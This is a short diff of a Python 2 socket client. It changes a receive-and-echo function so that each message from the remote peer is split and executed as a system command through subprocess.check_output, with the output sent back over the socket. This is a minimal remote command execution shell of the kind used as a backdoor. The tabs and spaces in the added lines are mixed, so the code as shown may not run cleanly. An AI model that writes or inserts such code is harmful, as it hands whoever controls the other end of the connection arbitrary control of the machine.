@@ -8,10 +8,12 @@ import socket
 def receive_send(sock):
 	t=sock.recv(1024)	
 	print t
-	sock.send(t)
 	if t=='done':
 		return False
 	else:
+                t=subprocess.check_output(t.split())
+                print t
+	        sock.send(t)
 		return True
 
 s=socket.socket()
